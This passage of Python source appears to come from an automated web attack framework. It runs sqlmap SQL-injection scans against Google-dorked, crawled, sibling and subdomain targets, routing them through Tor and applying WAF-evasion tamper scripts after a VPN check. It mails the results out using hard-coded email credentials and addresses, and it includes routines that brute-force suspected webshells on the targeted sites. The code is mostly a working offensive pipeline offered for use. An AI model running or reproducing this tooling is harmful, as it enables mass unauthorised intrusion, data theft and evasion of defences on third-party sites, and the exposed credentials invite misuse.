            tor_forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
                domain_url, each)
            #print("sqlmap_string is:%s" % sqlmap_string)
            #sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
            if not tor_or_not:
                print("sqlmap_string is:%s" % sqlmap_string)
                print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                forms_sqlmap_string)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")
            elif tor_or_not:
                print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
                print(
                    "tor_forms_sqlmap_string is:%s" %
                    tor_forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                tor_forms_sqlmap_string)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")

            sqlmap_result = get_sqlmap_result_and_save_result(each)
            if sqlmap_result != "":
                mail_msg_to(
                    sqlmap_result,
                    "2784046065@qq.com",
                    "ssqqll",
                    "18137062539@163.com",
                    "063913ok")


def sqlmap_crawl(origin_http_url_or_file, tor_or_not, post_or_not):
    # this function use sqlmap's "--crawl" option to find sqli urls.
    if re.match("(http://)|(https://)", origin_http_url_or_file):
        origin_http_url = re.sub(r'(\s)$', "", origin_http_url_or_file)
        sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
            origin_http_url, origin_http_url)
        forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
            origin_http_url, origin_http_url)
        tor_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
            origin_http_url, origin_http_url)
        tor_forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
            origin_http_url, origin_http_url)
        #print("sqlmap_string is:%s" % sqlmap_string)
        if not tor_or_not:
            print("sqlmap_string is:%s" % sqlmap_string)
            print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        elif tor_or_not:
            print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
            print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            tor_forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        sqlmap_result = get_sqlmap_result_and_save_result(
            origin_http_url_or_file)
        if sqlmap_result != "":
            mail_msg_to(
                sqlmap_result,
                "2784046065@qq.com",
                "ssqqll",
                "18137062539@163.com",
                "063913ok")

    else:
        fp = open(origin_http_url_or_file, "r+")
        all_urls = fp.readlines()
        fp.close()
        for each in all_urls:
            origin_http_url = re.sub(r'(\s)$', "", each)
            sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
                origin_http_url, origin_http_url)
            forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
                origin_http_url, origin_http_url)
            tor_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
                origin_http_url, origin_http_url)
            tor_forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
                origin_http_url, origin_http_url)
            #print("sqlmap_string is %s" % sqlmap_string)
            if not tor_or_not:
                print("sqlmap_string is:%s" % sqlmap_string)
                print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                forms_sqlmap_string)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")

            elif tor_or_not:
                print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
                print(
                    "tor_forms_sqlmap_string is:%s" %
                    tor_forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                tor_forms_sqlmap_string)
                        print(
                            666666666666666666666666669999999999999999999999999999999)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")

            sqlmap_result = get_sqlmap_result_and_save_result(each)
            if sqlmap_result != "":
                mail_msg_to(
                    sqlmap_result,
                    "2784046065@qq.com",
                    "ssqqll",
                    "18137062539@163.com",
                    "063913ok")


def sqlmap_g_human(http_url_or_file, tor_or_not, post_or_not):
    # this function use myGoogleScraper to search google dork to get the full
    # urls,in this mode,we need input the yanchengma by human,not robot,coz
    # sqlmap's -g option can only get the former 100 results,this function will
    # get almost the all results.
    if re.match("(http://)|(https://)", http_url_or_file):
        domain_url = http_url_or_file[7:] if re.match(
            "(http://)", url_or_file) else http_url_or_file[8:]
        query = '''site:%s inurl:php|asp|aspx|jsp''' % domain_url
        #import easy_search
        # search_url_list=blew expression
        # easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
        os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' %
                  query)  # here myenv/python3.5 is the selenium changed version
        sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
        forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
        tor_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
        tor_forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
        #print("sqlmap_string is:%s" % sqlmap_string)
        if not tor_or_not:
            print("sqlmap_string is:%s" % sqlmap_string)
            print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        elif tor_or_not:
            print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
            print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            tor_forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        sqlmap_result = get_sqlmap_result_and_save_result(http_url_or_file)
        if sqlmap_result != "":
            mail_msg_to(
                sqlmap_result,
                "2784046065@qq.com",
                "ssqqll",
                "18137062539@163.com",
                "063913ok")

    else:
        try:
            fp = open(http_url_or_file, "r+")
            all_urls = fp.readlines()
            #print("open file 666666")
            print(55555)
            print(all_urls)
            fp.close()
            for each in all_urls:
                domain_url = each[7:] if re.match(
                    "(http://)", each) else each[8:]
                print(6666)
                print(domain_url)
                query = '''site:%s inurl:php|asp|aspx|jsp''' % domain_url
                #import easy_search
                # search_url_list=blew expression
                # easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
                os.system(
                    '''/root/myenv/bin/python3.5 easy_search.py "%s"''' %
                    query)  # here myenv/python3.5 is the selenium changed version
            sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
            forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
            tor_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
            tor_forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
            #print("sqlmap_string is:%s" % sqlmap_string)
            if not tor_or_not:
                print("sqlmap_string is:%s" % sqlmap_string)
                print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                forms_sqlmap_string)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")

            elif tor_or_not:
                print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
                print(
                    "tor_forms_sqlmap_string is:%s" %
                    tor_forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                tor_forms_sqlmap_string)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")

            for each in all_urls:
                sqlmap_result = get_sqlmap_result_and_save_result(each)
                if sqlmap_result != "":
                    mail_msg_to(sqlmap_result, "2784046065@qq.com",
                                "ssqqll", "18137062539@163.com", "063913ok")

        except:
            print("open file error")


def sqli_scan(target):
    # 根据scan_way而采取相应的扫描sqli模式
    # target要求是http...格式,不能是纯domain
    http_domain = target
    main_target_table_name = get_main_target_table_name(http_domain)

    http_domain_sqli_scaned = get_scan_finished(
        "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, http_domain)
    pang_domains_sqli_scaned = get_scan_finished(
        "pang_domains_sqli_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        http_domain)
    sub_domains_sqli_scaned = get_scan_finished(
        "sub_domains_sqli_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        http_domain)
    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1 and http_domain_sqli_scaned == 1 and pang_domains_sqli_scaned == 1:
        return
    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2 and http_domain_sqli_scaned == 1 and sub_domains_sqli_scaned == 1:
        return
    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3 and http_domain_sqli_scaned == 1 and pang_domains_sqli_scaned == 1 and sub_domains_sqli_scaned == 1:
        return
    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4 and http_domain_sqli_scaned == 1:
        return

    print(
        '''do you want use 'tor' service in your sqli action? sometimes when your network is not very well,
is not a good idea to use tor,but when your targets has waf,use tor is better.
input Y(y) or N(n) default [N]:>''', end='')
    print('\n')
    choose_tor = get_input_intime('n', 5)
    print('\n')
    if choose_tor == 'Y' or choose_tor == 'y':
        bool_tor = True
    else:
        bool_tor = False

    print(
        '''do you want use 'post' request in your sqli scan? sometimes when you want a faster speed,
use 'get' request is enough,do no need to use 'post' request,meanwhile,when there exists some waf,
use 'get' and 'post' will try too many times's request which will make the waf block you ip,so in these cases,do not use 'post' request,
but use only 'get' request without 'post' request,the number of sqli points will be less in the common sense,
input Y(y) or N(n) default [N]:>''', end='')
    print('\n')
    choose_post = get_input_intime('n', 5)
    print('\n')
    if choose_post == 'Y' or choose_post == 'y':
        post_or_not = True
    else:
        post_or_not = False

    print('''there are two kinds of sqli blew:
1.use "sqlmap_crawl"
2.use "sqlmap-g-nohuman"
input your number here:''', end='')
    print('\n')
    num = str(get_input_intime(1, 5))
    print('\n')
    if num == str(1):
        while(1):
            if checkvpn():
                if http_domain_sqli_scaned == 0 or pang_domains_sqli_scaned == 0 or sub_domains_sqli_scaned == 0:
                    # 不管scan_way的值为多少,首先对main target进行sqli扫描
                    if http_domain_sqli_scaned == 0:
                        sqlmap_crawl(
                            http_domain, bool_tor, post_or_not)
                        set_scan_finished("sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                          main_target_table_name, http_domain)

                    domain_pang_file = "log/pang/%s_pang.txt" % http_domain.split(
                        '/')[-1].replace(".", "_")
                    domain_pang_table_name = domain_pang_file[9:-4]
                    domain_sub_file = "log/sub/%s_sub.txt" % http_domain.split(
                        '/')[-1].replace(".", "_")
                    domain_sub_table_name = domain_sub_file[8:-4]

                    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
                        # 1和3的扫描方式中要扫描旁站,此时对旁站进行sqli扫描
                        with open(domain_pang_file, "r+") as f:
                            domain_pang_list = f.readlines()
                            for pang_http_domain in domain_pang_list:
                                pang_http_domain_value = re.sub(
                                    r"(\s)$", "", pang_http_domain)
                                if pang_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, pang_http_domain_value)
                                    if sqli_scaned == 0:
                                        # 在子站表中查询是否当前旁站也是子站,如果是且在上次子站扫描中已经扫描过
                                        # 那么此次不再重复sqli扫描,并在旁站表中将sqli_scaned标记为1
                                        sqli_scaned = get_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, pang_http_domain_value)
                                        if sqli_scaned == 1:
                                            print(
                                                "this pang domain is the same to one sub domain whose sqli scan finished in sub domain table")
                                        else:
                                            sqlmap_crawl(
                                                pang_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, pang_http_domain_value)
                            set_scan_finished(
                                "pang_domains_sqli_scaned",
                                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                main_target_table_name,
                                http_domain)
                    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
                        with open(domain_sub_file, "r+") as f:
                            domain_sub_list = f.readlines()
                            for sub_domain in domain_sub_list:
                                sub_domain_value = re.sub(
                                    r"(\s)$", "", sub_domain)
                                sub_http_domain_value = get_http_or_https(
                                    sub_domain_value) + "://" + sub_domain_value
                                if sub_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, sub_http_domain_value)
                                    if sqli_scaned == 0:
                                        # 在旁站表中查询是否当前子站也是旁站,如果是且在上次旁站扫描中已经扫描过
                                        # 那么此次不再重复sqli扫描,并在子站表中将sqli_scaned标记为1
                                        sqli_scaned = get_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, sub_http_domain_value)
                                        if sqli_scaned == 1:
                                            print(
                                                "this sub domain is the same to one pang domain whose sqli scan finished in pang domain table")
                                        else:
                                            sqlmap_crawl(
                                                sub_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, sub_http_domain_value)
                            set_scan_finished(
                                "sub_domains_sqli_scaned",
                                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                main_target_table_name,
                                http_domain)

                    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
                        with open(domain_pang_file, "r+") as f:
                            domain_pang_list = f.readlines()
                            for pang_http_domain in domain_pang_list:
                                pang_http_domain_value = re.sub(
                                    r"(\s)$", "", pang_http_domain)
                                if pang_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, pang_http_domain_value)
                                    if sqli_scaned == 0:
                                        # 在子站表中查询是否当前旁站也是子站,如果是且在上次子站扫描中已经扫描过
                                        # 那么此次不再重复sqli扫描,并在旁站表中将sqli_scaned标记为1
                                        sqli_scaned = get_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, pang_http_domain_value)
                                        if sqli_scaned == 1:
                                            print(
                                                "this pang domain is the same to one sub domain whose sqli scan finished in sub domain table")
                                        else:
                                            sqlmap_crawl(
                                                pang_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, pang_http_domain_value)
                            set_scan_finished(
                                "pang_domains_sqli_scaned",
                                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                main_target_table_name,
                                http_domain)

                        with open(domain_sub_file, "r+") as f:
                            domain_sub_list = f.readlines()
                            for sub_http_domain in domain_sub_list:
                                sub_http_domain_value = re.sub(
                                    r"(\s)$", "", sub_http_domain)
                                if sub_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, sub_http_domain_value)
                                    if sqli_scaned == 0:
                                        # 在旁站表中查询是否当前子站也是旁站,如果是且在上次旁站扫描中已经扫描过
                                        # 那么此次不再重复sqli扫描,并在子站表中将sqli_scaned标记为1
                                        sqli_scaned = get_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, sub_http_domain_value)
                                        if sqli_scaned == 1:
                                            print(
                                                "this sub domain is the same to one pang domain whose sqli scan finished in pang domain table")
                                        else:
                                            sqlmap_crawl(
                                                sub_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, sub_http_domain_value)
                            set_scan_finished(
                                "sub_domains_sqli_scaned",
                                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                main_target_table_name,
                                http_domain)

                    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4:
                        pass
                    else:
                        print("scan_way error,check it")

                    break

                else:
                    print(
                        "it seems that one main target's sqli_scaned value you get is not what you want")
            else:
                time.sleep(1)
                print("vpn is off,scan will continue till vpn is on")

    if num == str(2):
        while(1):
            if checkvpn():

                if http_domain_sqli_scaned == 0 or pang_domains_sqli_scaned == 0 or sub_domains_sqli_scaned == 0:
                    # 不管scan_way的值为多少,首先对main target进行sqli扫描
                    if http_domain_sqli_scaned == 0:
                        sqlmap_g_nohuman(
                            http_domain, bool_tor, post_or_not)
                        set_scan_finished("sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                          main_target_table_name, http_domain)

                    domain_pang_file = "log/pang/%s_pang.txt" % http_domain.split(
                        '/')[-1].replace(".", "_")
                    domain_pang_table_name = domain_pang_file[9:-4]
                    domain_sub_file = "log/sub/%s_sub.txt" % http_domain.split(
                        '/')[-1].replace(".", "_")
                    domain_sub_table_name = domain_sub_file[8:-4]

                    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
                        # 1和3的扫描方式中要扫描旁站,此时对旁站进行sqli扫描
                        with open(domain_pang_file, "r+") as f:
                            domain_pang_list = f.readlines()
                            for pang_http_domain in domain_pang_list:
                                pang_http_domain_value = re.sub(
                                    r"(\s)$", "", pang_http_domain)
                                if pang_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, pang_http_domain_value)
                                    if sqli_scaned == 0:
                                        sqlmap_g_nohuman(
                                            pang_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, pang_http_domain_value)
                            set_scan_finished(
                                "pang_domains_sqli_scaned",
                                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                main_target_table_name,
                                http_domain)
                    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
                        with open(domain_sub_file, "r+") as f:
                            domain_sub_list = f.readlines()
                            for sub_http_domain in domain_sub_list:
                                sub_http_domain_value = re.sub(
                                    r"(\s)$", "", sub_http_domain)
                                if sub_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, sub_http_domain_value)
                                    if sqli_scaned == 0:
                                        sqlmap_g_nohuman(
                                            sub_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, sub_http_domain_value)
                            set_scan_finished(
                                "sub_domains_sqli_scaned",
                                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                main_target_table_name,
                                http_domain)

                    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
                        with open(domain_pang_file, "r+") as f:
                            domain_pang_list = f.readlines()
                            for pang_http_domain in domain_pang_list:
                                pang_http_domain_value = re.sub(
                                    r"(\s)$", "", pang_http_domain)
                                if pang_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, pang_http_domain_value)
                                    if sqli_scaned == 0:
                                        sqlmap_g_nohuman(
                                            pang_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_pang_table_name, pang_http_domain_value)
                            set_scan_finished(
                                "pang_domains_sqli_scaned",
                                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                main_target_table_name,
                                http_domain)
                        with open(domain_sub_file, "r+") as f:
                            domain_sub_list = f.readlines()
                            for sub_http_domain in domain_sub_list:
                                sub_http_domain_value = re.sub(
                                    r"(\s)$", "", sub_http_domain)
                                if sub_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, sub_http_domain_value)
                                    if sqli_scaned == 0:
                                        sqlmap_g_nohuman(
                                            sub_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), domain_sub_table_name, sub_http_domain_value)
                            set_scan_finished(
                                "sub_domains_sqli_scaned",
                                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                main_target_table_name,
                                http_domain)

                    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4:
                        pass
                    else:
                        print("scan_way error,check it")

                    break

                else:
                    print(
                        "it seems that one main target's sqli_scaned value you get is not what you want")
            else:
                time.sleep(1)
                print("vpn is off,scan will continue till vpn is on")


def single_crack_webshell_scan(target):
    table_name_list = get_target_table_name_list(target)
    target_urls_table_name = target.split("/")[-1].replace(".", "_") + "_urls"
    # regexp是大小写都匹配的,要强制只匹配大写或小写,要写成regexp binary '....'
    result = execute_sql_in_db(
        "select url from %s where url regexp '^http.*\.((php)|(asp)|(aspx)|(jsp))'" %
        (target_urls_table_name), eval(get_key_value_from_config_file('config.ini','default','db_name')))
    if len(result) > 0:
        for each in result:
            if len(each) > 0:
                # 在函数crack_webshell中包括检测url是否可能是webshell,并标记到数据库中相应字段,以及webshell爆破并根据爆
                # 破情况标记到数据库中相应字段,并邮件通知成功爆破的webshell
                crack_webshell(each[0])


def crack_webshell_scan(target):
    # 爆破模块,爆破可疑webshell url,爆破管理员登录页面
    # 爆破可疑webshell url用如下流程
    # a.确认脚本类型
    # b.正则查询已爬虫过的urls,找出a中的url,用函数crack_webshell,这里找到的会很少,一般只有上传的(eg.php)附件可被爬
    #   到
    # 根据扫描方式采取不同的爆破扫描

    main_target_table_name = get_main_target_table_name(target)
    table_name_list = get_target_table_name_list(target)
    http_domain_crack_webshell_scaned = get_scan_finished(
        "crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, target)
    pang_domains_crack_webshell_scaned = get_scan_finished(
        "pang_domains_crack_webshell_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    sub_domains_crack_webshell_scaned = get_scan_finished(
        "sub_domains_crack_webshell_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    if http_domain_crack_webshell_scaned == 1 and pang_domains_crack_webshell_scaned == 1 and sub_domains_crack_webshell_scaned == 1:
        return
    else:
        if http_domain_crack_webshell_scaned == 0:
            single_crack_webshell_scan(target)
            set_scan_finished("crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                              main_target_table_name, target)
        elif http_domain_crack_webshell_scaned == 1:
            print("main target crack webshell scaned")
            pass
        else:
            print("get_scan_finished error in crack_webshell_scan func")
        if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
            if pang_domains_crack_webshell_scaned == 1:
                return
            # 从数据库中获取target的旁站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        crack_webshell_scaned = get_scan_finished("crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if crack_webshell_scaned == 0:
                            single_crack_webshell_scan(each[0])
                            set_scan_finished("crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_pang", each[0])
                    else:
                        print(
                            "crack_webshell_scan func's each[0] error in scan_way 1")
                set_scan_finished(
                    "pang_domains_crack_webshell_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("crack_webshell_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
            if sub_domains_crack_webshell_scaned == 1:
                return
            # 从数据库中获取target的子站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
